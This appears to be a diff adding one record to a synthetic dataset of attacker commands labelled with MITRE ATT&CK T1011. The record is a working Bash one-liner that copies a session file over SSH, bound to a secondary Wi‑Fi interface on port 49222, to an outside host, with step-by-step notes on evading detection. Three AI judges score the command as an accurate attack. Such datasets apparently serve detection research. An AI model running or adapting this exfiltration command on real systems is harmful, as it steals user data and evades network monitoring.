@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan2 >/dev/null 2>&1 && rsync -a --quiet -e \"ssh -o ConnectTimeout=5 -o BindAddress=$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1) -p 49222\" /home/user/.cache/session.dat exfil@10.55.88.12:~/inbox/session.dat",
+  "explanation": "Performs rsync over SSH bound to the wlan2 source IP on a non-standard port, exfiltrating over a separate Wi‑Fi path consistent with T1011.",
+  "rationale_steps": [
+    "Monitor wlan2 status with iwconfig to ensure the alternate medium is available.",
+    "Bind SSH to wlan2’s IP to route only over the secondary Wi‑Fi network.",
+    "Transfer on a high, uncommon port to reduce correlation with typical SSH traffic."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-5d203e00",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting and valid options for iwconfig, rsync, and ssh.",
+        "semantic_score": 4,
+        "semantic_justification": "Uses rsync over SSH bound to wlan2’s IP to send a file to a remote host on a non-standard port, aligning with exfiltration over Wi‑Fi, though binding alone may not force WLAN egress without appropriate routing.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T01:30:00.485253Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators (&&), valid flags for iwconfig and rsync, and correct use of subshell execution for IP address extraction.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by first checking for the secondary network interface (wlan2), then using rsync over SSH bound specifically to that interface's IP address on a non-standard port (49222) to exfiltrate data to a remote server.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:30:05.494220Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command separators, and proper command substitution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly executes exfiltration over a specified Wi-Fi interface by explicitly binding SSH to its IP address on a non-standard port, directly achieving T1011's objective of using an alternate network medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:32:33.062320Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
